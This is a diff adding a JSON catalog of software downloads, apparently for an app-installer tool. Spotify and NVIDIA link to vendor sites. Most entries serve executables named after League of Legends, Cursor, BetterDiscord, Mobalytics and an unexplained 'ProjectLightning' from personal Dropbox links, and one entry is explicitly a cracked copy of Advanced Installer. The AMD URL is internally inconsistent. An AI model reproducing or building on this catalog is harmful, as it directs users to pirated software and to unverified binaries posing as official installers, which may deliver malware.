@@ -1,0 +1,69 @@
+[
+  {
+    "id": "AdvancedInstaller.Crack",
+    "name": "Advanced Installer",
+    "url": "https://www.dropbox.com/scl/fi/nx5ced8mt2t5mye4tus6j/Advanced-Installer-Architect-23.1.0.zip?rlkey=2bre9u83d9lfdvhhz778nvr04&st=cgpe2npr&dl=1",
+    "ext": "zip",
+    "category": "Utilities"
+  },
+  {
+    "id": "Spotify.Official",
+    "name": "Spotify",
+    "url": "https://download.scdn.co/SpotifySetup.exe",
+    "ext": "exe",
+    "category": "Media"
+  },
+  {
+    "id": "Nvidia.App",
+    "name": "NVIDIA App",
+    "resolver": "nvidia-app",
+    "url": "https://us.download.nvidia.com/nvapp/client/11.0.8.299/NVIDIA_app_v11.0.8.299.exe",
+    "ext": "exe",
+    "category": "Hardware"
+  },
+  {
+    "id": "AMD.AdrenalinSoftware",
+    "name": "AMD Graphics Driver",
+    "resolver": "amd-adrenalin",
+    "url": "https://drivers.amd.com/drivers/installer/26.10/whql/amd-software-adrenalin-edition-26.7.1-minimalsetup-260724_web.exe",
+    "ext": "exe",
+    "category": "Hardware"
+  },
+  {
+    "id": "BetterDiscord.Dropbox",
+    "name": "BetterDiscord",
+    "resolver": "betterdiscord",
+    "url": "https://www.dropbox.com/scl/fi/sjzh1xoiv87a20wvvesk4/BetterDiscord-Windows.exe?rlkey=bej8or99jo19189a7h2v6553e&dl=1",
+    "ext": "exe",
+    "category": "Communication"
+  },
+  {
+    "id": "LeagueOfLegends.Dropbox",
+    "name": "League of Legends",
+    "url": "https://www.dropbox.com/scl/fi/8e2lozlfwbw5uz00zxl78/League-of-Legends.exe?rlkey=q781tbxxn3k4l18jxws57d1a6&dl=1",
+    "ext": "exe",
+    "category": "Games"
+  },
+  {
+    "id": "Mobalytics.Dropbox",
+    "name": "Mobalytics",
+    "url": "https://www.dropbox.com/scl/fi/ud8dijdfoe6sg3ntjqsxt/Mobalytics.exe?rlkey=agawubkfhkpw9mluzn8tpydu8&dl=1",
+    "ext": "exe",
+    "category": "Games"
+  },
+  {
+    "id": "ProjectLightning.Dropbox",
+    "name": "ProjectLightning",
+    "url": "https://www.dropbox.com/scl/fi/0i9ikwaiwui6z6befhxtq/ProjectLightning.exe?rlkey=s49qkhhli071on5d23xz1gut7&dl=1",
+    "ext": "exe",
+    "category": "Utilities"
+  },
+  {
+    "id": "Cursor.Dropbox",
+    "name": "Cursor",
+    "resolver": "cursor",
+    "url": "https://www.dropbox.com/scl/fi/bjjx57hosduostifzkjjr/Cursor.exe?rlkey=o60g8k5ct0j36bwysfk9sh53l&dl=1",
+    "ext": "exe",
+    "category": "Development"
+  }
+]
